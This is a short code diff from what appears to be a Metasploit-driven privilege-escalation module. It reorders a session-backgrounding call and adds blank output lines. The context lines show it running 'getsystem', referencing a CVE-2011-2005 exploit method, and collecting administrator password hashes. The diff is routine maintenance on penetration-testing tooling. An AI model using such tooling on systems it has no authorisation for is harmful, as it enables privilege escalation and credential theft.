@@ -57,6 +57,7 @@ class PriviledgeEsc(object):
         # attempt to escalate privs
         cmd = "getsystem"
         msf_reply = config.MSFCONSOLE.callback(cmd, verbose=False)
+        config.MSFCONSOLE.background_session(target_name)
         # attempt to update privs
         self.update_priviledes(target_name, verbose)
         if verbose:
@@ -67,7 +68,6 @@ class PriviledgeEsc(object):
             else:
                 print("[-] escalation via tokens failed ")
         # background session
-        config.MSFCONSOLE.background_session(target_name)
 
     def exploit_cve_2011_2005(self, target_name, verbose=True):
         """
@@ -130,9 +130,11 @@ class PriviledgeEsc(object):
                 config.MSFCONSOLE.background_session(target_name)
                 print("[+] administrator password hash added:")
                 print("    " + hash)
+                print()
                 return
         config.MSFCONSOLE.background_session(target_name)
         print("[-] unable to collect administrator password hash")
+        print()
 
 
 
